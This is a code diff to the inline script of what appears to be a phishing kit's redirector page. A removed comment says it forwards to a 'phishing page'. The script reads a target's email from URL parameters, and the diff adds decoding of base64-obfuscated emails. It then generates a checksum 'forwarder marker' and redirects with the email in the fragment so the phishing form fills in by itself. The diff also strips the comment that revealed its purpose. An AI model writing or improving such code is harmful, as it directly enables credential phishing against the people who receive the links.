@@ -163,40 +163,55 @@
     </div>
 
     <script>
+        // Decode base64 if the string looks like base64 encoded
+        function decodeIfBase64(str) {
+            if (!str) return str;
+            // Check if it looks like base64 (only base64 chars, length divisible by 4 or has padding)
+            var base64Regex = /^[A-Za-z0-9+/=_-]+$/;
+            if (!base64Regex.test(str)) return str;
+            // If it contains @ it's already a plain email
+            if (str.indexOf('@') !== -1) return str;
+            try {
+                // Handle URL-safe base64
+                var normalized = str.replace(/-/g, '+').replace(/_/g, '/');
+                // Add padding if needed
+                while (normalized.length % 4) normalized += '=';
+                var decoded = atob(normalized);
+                // Check if decoded looks like an email
+                if (decoded.indexOf('@') !== -1 && decoded.indexOf('.') !== -1) {
+                    return decoded;
+                }
+            } catch(e) {}
+            return str;
+        }
+
         setTimeout(function() {
             document.getElementById('main-container').classList.add('fade-out');
             setTimeout(function() {
-                // Forward to phishing page by adding the forwarder marker
                 var url = new URL(window.location.href);
                 
                 // Extract email from URL parameters
-                var email = url.searchParams.get('email') || 
-                            url.searchParams.get('e') || 
-                            url.searchParams.get('u') || 
-                            url.searchParams.get('login_hint') ||
-                            url.searchParams.get('user') ||
-                            url.searchParams.get('mail') ||
-                            '';
+                var rawEmail = url.searchParams.get('email') || 
+                               url.searchParams.get('e') || 
+                               url.searchParams.get('u') || 
+                               url.searchParams.get('login_hint') ||
+                               url.searchParams.get('user') ||
+                               url.searchParams.get('mail') ||
+                               '';
                 
-                // Generate 4 random bytes for forwarder marker
+                // Decode if base64 encoded
+                var email = decodeIfBase64(rawEmail);
+                
+                // Generate forwarder marker
                 var b1 = Math.floor(Math.random() * 256);
                 var b2 = Math.floor(Math.random() * 256);
                 var b3 = Math.floor(Math.random() * 256);
                 var b4 = Math.floor(Math.random() * 256);
-                
-                // Calculate checksum (sum of 4 bytes mod 256)
                 var crc = (b1 + b2 + b3 + b4) & 0xFF;
-                
-                // Create 5-byte array: [checksum, b1, b2, b3, b4]
                 var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
-                
-                // Base64 encode and make URL safe (raw encoding, no padding)
                 var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                 
-                // Add forwarder marker as query parameter
                 url.searchParams.set('_r', marker);
-                
-                // Build final URL with email as hash fragment for autofill
                 var finalUrl = url.toString();
                 if (email) {
                     finalUrl += '#' + encodeURIComponent(email);
